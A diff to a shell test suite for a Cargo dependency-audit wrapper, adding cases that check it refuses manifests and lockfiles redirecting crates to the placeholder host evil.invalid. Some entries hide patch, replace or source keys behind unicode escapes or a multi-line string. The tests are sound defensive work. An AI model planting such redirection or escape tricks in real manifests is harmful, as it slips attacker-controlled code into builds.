@@ -717,7 +717,7 @@ while IFS='|' read -r form rest; do
   run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
   label=$(printf '%s' "$form" | cut -c1-36)
   check "a [patch]/[replace] table as '$label': exit 3, cargo never runs, nothing disclosed" sh -c "
-    [ '$RC' = 3 ] && grep -qE '^deps: blocker: stubs/Cargo.toml (holds a \[patch\] or \[replace\] table|sets a root patch or replace key)' '$T/err' &&
+    [ '$RC' = 3 ] && grep -qE '^deps: blocker: stubs/Cargo.toml (holds a |sets a root |has a table header with a |has a key before its first table header)' '$T/err' &&
     ! grep -q '^== cargo' '$T/calls' && [ \"\$(( \$(wc -l < '$DT') - 1 ))\" = '$r0' ]"
 done <<'FORMS'
 [patch.crates-io]|serde = { version = "1", registry-index = "sparse+https://evil.invalid/" }
@@ -728,7 +728,25 @@ done <<'FORMS'
 patch.crates-io.serde = { registry-index = "sparse+https://evil.invalid/" }|
 "patch".crates-io.serde = { git = "https://evil.invalid/x" }|
 patch = { crates-io = { serde = { git = "https://evil.invalid/x" } } }|
+["\u0070atch".crates-io]|serde = { git = "https://evil.invalid/x" }
+["\U00000072eplace"]|"serde:1.0.0" = { path = "/tmp" }
+[[patch.crates-io]]|name = "serde"
+"\u0070atch".crates-io.serde = { git = "https://evil.invalid/x" }|
 FORMS
+# A multi-line string before the first table header can hide a root key from a line scan (cargo reads the
+# patch below as a root key); the second line refuses anything there but comments and cargo-features.
+printf 'x = """\n[package]\n"""\npatch = { crates-io = { serde = { git = "https://evil.invalid/x" } } }\n[package]\nname = "ms"\nversion = "0.1.0"\nedition = "2021"\n' > "$WT/stubs/Cargo.toml"
+r0=$(rows)
+run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
+check "a root key hidden after a multi-line string: exit 3, cargo never runs, nothing disclosed" sh -c "
+  [ '$RC' = 3 ] && grep -q '^deps: blocker: stubs/Cargo.toml has a key before its first table header' '$T/err' &&
+  ! grep -q '^== cargo' '$T/calls' && [ \"\$(( \$(wc -l < '$DT') - 1 ))\" = '$r0' ]"
+# What the second line must not refuse: a byte-order mark, a comment and a one-line cargo-features before the
+# first header, a cfg target header with escaped quotes, and dependency keys named, or escaped to, patch.
+printf '\357\273\277# a comment\n\ncargo-features = ["edition2024"]\n[package]\nname = "ok"\nversion = "0.1.0"\nedition = "2021"\n[target."cfg(target_os = \\"linux\\")".dependencies]\nlibc = "0.2"\n[dependencies]\npatch = "1.0"\n"\\u0070atch2" = "1"\n' > "$WT/stubs/Cargo.toml"
+run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml
+check "the second line passes a BOM, comments, cargo-features, an escaped-quote cfg header and keys named patch" \
+  sh -c "[ '$RC' = 0 ] && grep -q '^== cargo tree ' '$T/calls'"
 # A lockfile that names a source other than crates.io, or a patch table, is refused before cargo runs.
 printf '[package]\nname = "lp"\nversion = "0.1.0"\nedition = "2021"\n[dependencies]\nanyhow = "1"\n' > "$WT/stubs/Cargo.toml"
 for lock in 'git+https://evil.invalid/x' 'sparse+https://evil.invalid/'; do
@@ -739,6 +757,9 @@ done
 printf 'version = 3\n\n[[patch.unused]]\nname = "x"\nversion = "1.0.0"\nsource = "git+https://evil.invalid/x"\n' > "$WT/stubs/Cargo.lock"
 run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml --manifest stubs/Cargo.lock
 check "a lockfile with a patch table is refused" sh -c "[ '$RC' = 3 ] && grep -q 'the lockfile holds a patch or replace table' '$T/err' && ! grep -q '^== cargo' '$T/calls'"
+printf 'version = 3\n\n[[package]]\nname = "anyhow"\nversion = "1.0.0"\n"\\u0073ource" = "git+https://evil.invalid/x"\n' > "$WT/stubs/Cargo.lock"
+run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml --manifest stubs/Cargo.lock
+check "a lockfile with a unicode escape (cargo writes none) is refused" sh -c "[ '$RC' = 3 ] && grep -q 'the lockfile has a .u, .U or .x escape' '$T/err' && ! grep -q '^== cargo' '$T/calls'"
 # vet() still refuses a git, alt-registry or out-of-tree path dependency that metadata surfaces.
 for dep in '{"name":"evil","source":"git+https://evil.invalid/x","registry":null}|from git+https://evil.invalid/x, not crates.io' \
   '{"name":"alt","source":"registry+https://alt.invalid/index","registry":"https://alt.invalid/index"}|from another registry than crates.io' \
